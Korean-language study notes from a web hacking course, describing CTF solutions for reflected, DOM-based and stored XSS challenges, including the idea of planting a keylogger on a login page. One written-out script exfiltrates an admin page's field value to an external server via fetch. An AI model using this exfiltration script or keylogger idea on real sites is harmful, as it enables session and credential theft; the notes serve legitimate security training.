      1. 혹시 허용된 태그 안에 eventHandler 로 악의적인 스크립트가 있을 수 있으니 블랙리스트 기반 치환

  • 10주차 크사 6번 문제 풀이

    로그인 페이지 post 요청에서 크사 발생 → 문제는 풀 수 있지만, 세션 탈취해도 로그인 된 상태가 아니라서 실제 상황에서는 쓸모 없을 가능성 높음!
    ⇒ 이럴 경우, (로그인 데이터 입력하는 페이지에 스크립트를 삽입할 수 있다면) 키로거를 심어서 사용자 입력 id, pw 를 직접 탈취하는 방법도 생각해 볼 수 있음

    • 추가로, 로그인 실패 alert 뜬 뒤 곧바로 로그인 페이지로 이동시키는 방식으로 페이지가 작동해서 내가 삽입한 스크립트가 확실히 실행되는지 안되는지(그리고 완료까지 다 되는지) 까다로운 측면에 대해 설명하면서, navigator.sendBeacon 함수 설명 있었음. 확실하게 요청 보내는것 보장해줌 (브라우저 환경 타긴 한다고 하심)
      • Beacon API

      문제풀었을때 딱히 시간차 관련 문제를 못느꼈던 것 같아서 다시 찾아보니, alert 함수에 들어가는 문자열 인자에서부터 replace 함수를 실행해서 그 다음 스크립트 태그(login.html 로 이동시키는) 실행 전에 fetch 함수가 실행될 수 있었던 것 같음. alert 가 있을 경우 확인버튼 누르기 전에 다음 스크립트 태그가 절대 실행되지 않는 것인지?는 잘 모르겠음

  • 수업 중 풀어본 크사 챌린지 문제

    공격은 리플렉티드 크사와 거의 유사하게 진행될 수 있지만, 서버가 직접 악의적인 스크립트를 넘겨주지는 않음.

    검색어 입력 → url 패러미터로 들어감 → js 가 파싱해서 문서에 추가하게 됨 (document.write 같은 함수 사용)

    이런 유형을 DOM Based XSS 라고 한다고 하심.

11주차 과제 ctf 문제풀이 과정 정리

  • 클라이언트 스크립트 베이직 문제

    마이페이지의 url 패러미터에 user 값을 변경하면 페이지에 반영됨 → 스크립트 삽입 가능

    ⇒ 자바스크립트로 document.getElementBy~~ 류 함수 사용해서 필요한 정보 추출할 수 있음(내 서버로 보내기 or 나중에 데이터 확인할 수 있는 곳으로 빼돌리기)

  • 클라이언트 스크립트 스틸인포1 문제

    스틸인포 문제들은 모두 게시판 게시글에 스크립트 삽입이 가능한 상황.

    관리자가 방문할 실제 타겟페이지와 그 페이지랑 동일하게 생긴 예시페이지 주소가 제시됨.

    예시페이지 구조 파악 후 게시글에 스크립트로 예시페이지에서 원하는 정보가 있는 태그의 텍스트 값을 추출 및 외부서버로 전송하는 스크립트 만들어보면서 테스트

    ⇒ 예시페이지 주소를 타겟페이지로 변경한 뒤 해당 게시글 링크를 관리자 봇이 방문하도록 하면 됨

  • 클라이언트 스크립트 스틸인포2 문제

    게시판을 사용하는 것은 동일함.

    타겟페이지는 게시판서비스의 마이페이지(/scriptPrac2/mypage.php)이고

    수업에서 쌤이 알려준 것 처럼 iframe 만들어서 뒤져보는 것이 귀찮아서 fetch 함수를 사용해 마이페이지 주소를 요청한 뒤 응답결과 html 텍스트 전체를 외부서버에 post 방식으로 전송하고, 서버는 tmp 폴더에 저장하도록 시도해봄.

    ctf 게시판 서비스에 실제 계정으로 로그인해서 위와 같이 스크립트를 삽입한 게시글 작성 후, 노트북 브라우저에서 방문 했을 경우에는, 로그인한 계정의 mypage 페이지 소스가 정상적으로 저장되었음.

    하지만 관리자 봇에게 해당 게시글 방문시켰을때는, 로그인하지 않은 상태로 mypage.php 를 방문했을때 처럼 “잘못된 접근입니다” alert 뜨고, id, info 관련 input 태그에 placeholder 값이 채워지지 않은 문서가 저장되는 것을 확인했음.

    스틸인포1 문제에서는 같은 방식으로 fetch 함수를 사용해서 타겟페이지 문서를 관리자 봇의 브라우저에서 요청하도록 하고 데이터를 잘 찾을 수 있었는데, 여기서는 왜 안되는지 이유를 찾아보려 몇가지 실험을 조금 해봤지만…

<script>
  const i=setInterval(
    ()=>{
      const t=document.getElementById('target');
      fetch('https://segfault.dnode.link/'+t.contentDocument.getElementsByName('info')[0].getAttribute('placeholder'));
      clearInterval(i)
    },
    100
  )
</script>

    로컬에서 테스트해봤을때

    iframe 생성 후 페이지가 로드된 뒤에 스크립트가 실행되기도 하고, 어쩔때는 iframe 에 페이지가 다 불러지지 않아서 contentDocument 값이 없는 경우가 왔다갔다 했음. 그래서 setInterval 함수를 사용해 페이지 로딩 된 뒤 적당한 시간 후에 데이터 추출 및 전송하는 코드 실행되도록 함.

    흥미로웠던 부분은 getElementsByName 으로 원하는 인풋태그 선택해서 placeholder 속성값을 가져올때

    id, info, pw 값을 선택하면 로컬에서는 모두 잘 가져올 수 있음.
